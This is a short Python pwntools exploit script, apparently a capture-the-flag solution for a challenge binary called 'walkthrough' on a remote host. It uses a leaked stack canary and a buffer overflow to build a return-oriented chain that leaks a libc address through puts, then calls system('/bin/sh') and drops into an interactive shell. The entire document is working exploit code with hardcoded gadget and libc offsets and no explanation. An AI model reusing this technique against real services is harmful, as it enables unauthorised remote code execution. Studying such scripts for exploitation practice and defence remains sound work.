from pwn import *
context.binary = elf = ELF('./walkthrough', checksec=False)

s = remote('147.182.172.217', 42001)
#s = remote('localhost', 10000)

s.recvuntil(b'First, here is the canary value (what is canary explained later): ')
canary = int(s.recvline()[:-1], 16)

pop_rdi = 0x00401e9b
payload = b'A' * 0x48
payload += p64(canary)
payload += p64(canary)
payload += p64(pop_rdi)
payload += p64(elf.got.puts)
payload += p64(elf.plt.puts)
payload += p64(elf.symbols.rop)

s.sendline(payload)

s.recvuntil(b'I hope you figured it out!\n')
s.recvline()

libc_base = u64(s.recvline()[:-1].ljust(8, b'\x00')) - 0x0875a0
system = libc_base + 0x055410
binsh = libc_base + 0x1b75aa

payload = b'A' * 0x48
payload += p64(canary)
payload += p64(canary)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(0x00401016)
payload += p64(system)

s.sendline(payload)

s.interactive()
